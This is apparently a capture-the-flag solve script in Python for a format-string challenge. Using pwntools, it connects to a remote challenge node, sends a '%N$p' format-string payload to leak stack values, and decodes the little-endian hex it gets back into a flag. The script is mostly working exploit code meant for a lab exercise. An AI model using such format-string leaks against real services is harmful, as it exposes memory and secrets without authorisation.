nums=["7364667b67616c66","6b6779686a6b6961","67666a6473616a6c","0000000000000a7d"]
def print_littel_Xu(nums):
    for strs in nums:
        i = len(strs)-2
        while i >= 0:
            num = strs[i:i+2]
            print(chr(int(num,16)),end="")
            i = i-2
print_littel_Xu(nums)
#NSSCTF{e8b833e4-691e-4e10-8458-bcf42b0ee176}

from pwn import *
io = remote("node5.anna.nssctf.cn", 28265)
io.sendline("%12$p%13$p%14$p%15$p%16$p%17$p")
io.recvline()
nums_b = io.recvline()[:-1].split(b"0x")
print(nums_b)
nums = [str(hex(int(data, 16)))[2:] for data in nums_b[1:]]
print(nums)
print_littel_Xu(nums)

io.interactive()